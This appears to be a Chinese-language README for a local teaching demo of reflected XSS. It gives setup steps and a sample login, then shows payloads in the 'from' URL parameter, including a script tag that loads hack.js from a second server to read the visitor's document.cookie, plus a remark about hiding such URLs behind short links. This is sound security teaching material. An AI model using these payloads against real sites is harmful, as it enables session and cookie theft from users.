# xss-cookie
### 安装数据库
首先需要安装数据库，具体见https://mp.csdn.net/postedit/104061730
有我的安装和数据添加过程。

###克隆我的git

####安装依赖

cnpm i

nodemon index.js

打开浏览器输入 http://localhost:3000/

先用你自己设置的数据登陆。
以我的为例：用户名：liuwei
           密码：  111111
 
 
 页面中的信息中的china来自地址栏：http://localhost:3000/?from=china
 
 你可以输入
http://localhost:3000/?from=<script>alert(3)</script>

会发现有弹窗。

再次输入http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>

就可以获取到你的document.cookie值了。

有时候会通过短地址的形式伪装url。




